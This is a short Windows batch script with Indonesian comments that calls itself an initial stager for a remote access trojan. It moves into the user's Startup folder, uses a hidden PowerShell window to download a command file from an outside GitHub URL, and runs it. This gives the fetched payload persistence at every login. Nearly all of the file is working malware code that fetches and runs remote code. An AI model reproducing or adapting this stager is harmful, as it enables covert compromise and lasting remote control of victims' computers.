@echo off
@REM initial stager for RAT
@REM created by : ivans

@REM variabel
set "initialpath=%cd%"

@REM Berpindah ke direktori Startup
cd C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup

@REM membuat payload di startup
@REM dalam kasus ini, payload mendownload dari winrar
powershell -windowstyle hidden "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/KutilKuda/labs/refs/heads/main/wget.cmd' -OutFile 'wget.cmd'"

powershell ./wget.cmd
@REM cd ke lokasi awal 
cd "%initialpath%"


